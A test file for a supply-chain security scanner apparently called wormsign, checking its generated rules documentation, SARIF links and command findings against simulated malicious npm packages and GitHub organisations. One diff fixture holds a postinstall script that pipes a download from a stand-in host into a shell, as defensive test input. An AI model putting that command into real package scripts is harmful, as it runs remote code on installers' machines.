// docs/rules.md is generated from src/rules.ts by scripts/gen-rules-doc.mjs. These tests fail when the page is out
// of date, when the generator stops reading the catalogue, when a SARIF helpUri stops pointing at a rule's section,
// and when the commands report a rule from a command or at a severity the page does not list.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { RULES } from "../src/rules.js";
import { toSarif } from "../src/sarif.js";
import type { RuleInfo } from "../src/types.js";
import { NOW, fx } from "./helpers.js";
import { cli, fakeGitHub, tempTree } from "./validation-helpers.js";

const repoRoot = fileURLToPath(new URL("../../", import.meta.url));
interface Meta {
  commands: string[];
  severities: string[];
  when: string;
}
interface Generator {
  renderRulesDoc: (rules: RuleInfo[], meta?: Record<string, Meta>) => string;
  RULE_META: Record<string, Meta>;
}
const generator = (): Promise<Generator> => import(pathToFileURL(join(repoRoot, "scripts", "gen-rules-doc.mjs")).href) as Promise<Generator>;
const committed = (): string => readFileSync(join(repoRoot, "docs", "rules.md"), "utf8");

test("docs/rules.md is what scripts/gen-rules-doc.mjs writes from src/rules.ts", async () => {
  const { renderRulesDoc } = await generator();
  assert.equal(committed(), renderRulesDoc(RULES), "docs/rules.md is out of date: run npm run docs:rules and commit the result");
});

test("the generator reads the catalogue: an edited, added or removed rule changes or stops the output", async () => {
  const { renderRulesDoc, RULE_META } = await generator();
  const first = RULES[0] as RuleInfo;
  const edited = RULES.map((r) => (r === first ? { ...r, help: `${r.help} Edited for the test.` } : r));
  const out = renderRulesDoc(edited);
  assert.notEqual(out, committed(), "an edited help text must change the generated page");
  assert.ok(out.includes("Edited for the test."), "the edited help text must appear on the page");
  const renamed = renderRulesDoc(RULES.map((r) => (r === first ? { ...r, name: "renamed-rule" } : r)));
  assert.ok(renamed.includes("renamed-rule") && renamed !== committed());
  // A rule without command and severity entries, or an entry without a rule, is an error, not a silent omission.
  assert.throws(() => renderRulesDoc([...RULES, { id: "WS-LC-999", name: "new", description: "d", help: "h" }]), /no entry for WS-LC-999/);
  assert.throws(() => renderRulesDoc(RULES.slice(1)), new RegExp(`entry without a rule: ${first.id}`));
  assert.deepEqual(Object.keys(RULE_META).sort(), RULES.map((r) => r.id).sort());
});

test("every rule has one section whose GitHub anchor is its lower-case id, and its SARIF helpUri points there", () => {
  const doc = committed();
  const driver = (toSarif([], "0.0.0-test") as { runs: { tool: { driver: { rules: { id: string; helpUri: string }[] } } }[] }).runs[0]?.tool.driver;
  // GitHub's heading anchor: lower-cased, characters other than letters, digits, spaces and hyphens dropped, spaces to hyphens.
  const anchor = (heading: string): string => heading.toLowerCase().replace(/[^a-z0-9 -]/g, "").replace(/ /g, "-");
  const headings = [...doc.matchAll(/^#{1,6} (.+)$/gm)].map((m) => anchor(m[1] as string));
  for (const r of RULES) {
    const id = r.id.toLowerCase();
    assert.equal(headings.filter((h) => h === id).length, 1, `docs/rules.md needs exactly one heading whose anchor is #${id}`);
    assert.equal(driver?.rules.find((x) => x.id === r.id)?.helpUri, `https://github.com/stgllghr/wormsign/blob/main/docs/rules.md#${id}`);
  }
});

const TEST_IOCS = ["--iocs", fx("iocs")];
const home = (): Record<string, string> => ({ HOME: mkdtempSync(join(tmpdir(), "wormsign-home-")) });
const H = 3_600_000;
const npmLock = (ids: string[]): string =>
  JSON.stringify({
    name: "app",
    version: "1.0.0",
    lockfileVersion: 3,
    requires: true,
    packages: Object.fromEntries([["", { name: "app", version: "1.0.0" }], ...ids.map((id) => { const [n, v] = id.split("@") as [string, string]; return [`node_modules/${n}`, { version: v, resolved: `https://registry.npmjs.org/${n}/-/${n}-${v}.tgz`, integrity: "sha512-x" }]; })]),
  });

/** A registry and OSV that report a 5-day-old version adding a preinstall, dropping provenance, by a new publisher, with a MAL- record. */
const signalsFetch = (async (url: string | URL, init?: RequestInit) => {
  if (String(url) === "https://api.osv.dev/v1/querybatch") {
    const { queries } = JSON.parse(String(init?.body)) as { queries: unknown[] };
    return new Response(JSON.stringify({ results: queries.map(() => ({ vulns: [{ id: "MAL-0000-1", modified: NOW.toISOString() }] })) }));
  }
  const ago = (days: number) => new Date(NOW.getTime() - days * 24 * H).toISOString();
  const dist = { integrity: "sha512-x", tarball: "https://registry.npmjs.org/lib/-/lib-1.0.1.tgz" };
  const versions = {
    "1.0.0": { _npmUser: { name: "alice" }, dist: { ...dist, attestations: { provenance: { predicateType: "https://slsa.dev/provenance/v1" } } } },
    "1.0.1": { _npmUser: { name: "mallory" }, scripts: { preinstall: "node setup.js" }, dist },
  };
  return new Response(JSON.stringify({ name: "lib", time: { "1.0.0": ago(60), "1.0.1": ago(5) }, versions }));
}) as typeof fetch;

/** Runs that report as many rules as the fixtures allow, each tagged with the command that ran. */
const RUNS: { command: string; argv: string[]; over?: Parameters<typeof cli>[1] }[] = [
  { command: "scan", argv: ["scan", fx("malicious"), ...TEST_IOCS] },
  { command: "scan", argv: ["scan", fx("nm"), "--node-modules", ...TEST_IOCS] },
  { command: "scan", argv: ["scan", tempTree({ "wormsign_marker_loader.js": "not the sample\n", "package.json": "{ not json" }), ...TEST_IOCS] },
  { command: "diff", argv: ["diff", `dir:${fx("diff", "base")}`, `dir:${fx("diff", "head")}`, ...TEST_IOCS] },
  {
    command: "diff",
    argv: ["diff", `dir:${tempTree({ "package.json": "{}" })}`, `dir:${tempTree({ "package.json": '{"scripts":{"postinstall":"curl -s https://example.invalid/x | sh"}}', ".npmrc": "ignore-scripts=false\n", "bun.lock": "{}\n" })}`, ...TEST_IOCS],
  },
  { command: "soak", argv: ["soak", tempTree({ "package-lock.json": npmLock(["lib@1.0.1"]) })], over: { env: home(), fetchImpl: signalsFetch } },
  // --on-outage warn: the registry out for the whole run (WS-SK-006), then OSV out for the whole run (WS-OS-901).
  { command: "soak", argv: ["soak", tempTree({ "package-lock.json": npmLock(["down@1.0.0"]) }), "--on-outage", "warn"], over: { env: home(), sleep: async () => {}, fetchImpl: (async () => new Response("", { status: 503 })) as typeof fetch } },
  {
    command: "soak",
    argv: ["soak", tempTree({ "package-lock.json": npmLock(["lib@1.0.1"]) }), "--on-outage", "warn"],
    over: { env: home(), sleep: async () => {}, fetchImpl: (async (url: string | URL, init?: RequestInit) => (String(url).startsWith("https://api.osv.dev/") ? new Response("", { status: 503 }) : signalsFetch(url, init))) as typeof fetch },
  },
  { command: "soak", argv: ["soak", tempTree({ "package-lock.json": npmLock(["young@1.0.0"]), ".npmrc": "min-release-age=1\n" }), "--require-config"], over: { env: home(), fetchImpl: (async () => new Response("{}", { status: 404 })) as typeof fetch } },
  { command: "soak", argv: ["soak", tempTree({ "yarn.lock": readFileSync(fx("lockfiles", "yarn1", "yarn.lock"), "utf8") }), "--config-only"], over: { env: home() } },
  {
    command: "audit-org",
    argv: ["audit-org", "acme", ...TEST_IOCS],
    over: {
      env: { GITHUB_TOKEN: "test-token" },
      fetchImpl: fakeGitHub("acme", {
        repos: [{ name: "wormsign-marker-repo" }, { name: "app" }],
        workflows: { app: ["ci.yml", "wormsign-marker-workflow.yml"] },
        orgRunners: ["WORMSIGNTEST", "build-1"],
        auditLog: { "repo.access": [{ action: "repo.access", repo: "acme/app", actor: "mallory", visibility: "public", "@timestamp": NOW.getTime() - H }] },
      }),
    },
  },
  { command: "audit-org", argv: ["audit-org", "acme", ...TEST_IOCS], over: { env: { GITHUB_TOKEN: "test-token" }, fetchImpl: fakeGitHub("acme", { repos: [{ name: "app" }] }) } },
];

test("each rule the commands report comes from a command and at a severity docs/rules.md lists for it", async () => {
  const { RULE_META } = await generator();
  const seen = new Set<string>();
  for (const r of RUNS) {
    const { findings } = await cli(r.argv, r.over ?? {});
    assert.ok(findings.length > 0, `wormsign ${r.argv.join(" ")} reported nothing, so it checks nothing here`);
    for (const f of findings) {
      const m = RULE_META[f.ruleId];
      assert.ok(m, `${f.ruleId} has no entry in RULE_META`);
      assert.ok(m.commands.includes(r.command), `${f.ruleId} was reported by ${r.command}, which docs/rules.md does not list (${m.commands.join(", ")})`);
      assert.ok(m.severities.includes("ioc") || m.severities.includes(f.severity), `${f.ruleId} was reported at ${f.severity}, which docs/rules.md does not list (${m.severities.join(", ")})`);
      seen.add(f.ruleId);
    }
  }
  // Positive control: the runs above must reach most of the catalogue, or this test proves little.
  assert.ok(seen.size >= 35, `only ${seen.size} rules were reported: ${[...seen].sort().join(", ")}`);
});

test("rules: WS-DF-001 says how a reviewed install-script dependency gets through, and WS-SK-001 what catches a young pin pushed to the base", () => {
  const help = (id: string): string => RULES.find((r) => r.id === id)!.help;
  const doc = committed();
  for (const phrase of ["the owner of the required check overrides it", "itself fails WS-DF-005 and needs the same override", "docs/adr/0008-baseline-approval-route.md"]) {
    assert.ok(help("WS-DF-001").includes(phrase), phrase);
    assert.ok(doc.includes(phrase), `docs/rules.md: ${phrase}`);
  }
  for (const phrase of ["an npm or Python entry the base's own soak read identically", "a young version pushed directly to the base passes later pull requests", "the full soak on push and on a schedule catches it", "never read as a lock is checked once a change makes it one"]) {
    assert.ok(help("WS-SK-001").includes(phrase), phrase);
    assert.ok(doc.includes(phrase), `docs/rules.md: ${phrase}`);
  }
});
